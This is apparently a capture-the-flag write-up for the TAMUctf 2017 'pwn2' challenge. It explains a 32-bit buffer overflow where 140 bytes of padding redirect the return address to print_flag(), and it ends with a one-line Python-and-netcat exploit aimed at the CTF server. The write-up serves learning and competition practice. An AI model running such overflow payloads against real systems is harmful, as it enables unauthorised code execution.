---
title: "TAMUctf 2017 : pwn100-pwn2"
date: "2017-04-24T13:55:16.000Z"
lastmod: "2017-06-05T15:26:22.000Z"
tags: ["ctf", "pwn", "reverse engineering", "tamuctf2k17"]
slug: "tamuctf-2017-pwn100-pwn2"
url: "/tamuctf-2017-pwn100-pwn2/"
---
nc pwn.ctf.tamu.edu 4321   
The flag printing functionality has been deprecated.

## Solution

So.. another 32bit binary vulnerable to buffer overflow

![](/content/images/2017/04/Selection_660.png)

..w/ `140 bytes` of junk we can overwrite the return pointer.

![](/content/images/2017/04/Selection_655.png)

but.. return to where?

![](/content/images/2017/04/Selection_656.png)

and.. in this case, we can directly execute the function `print_flag()`

![](/content/images/2017/04/Selection_659.png)

*ez pz lemon sqz :)*

### Final remote exploit

```bash
python -c 'print "A"*140 + "\x4b\x85\x04\x08"*1 ' | nc pwn.ctf.tamu.edu 4321
```
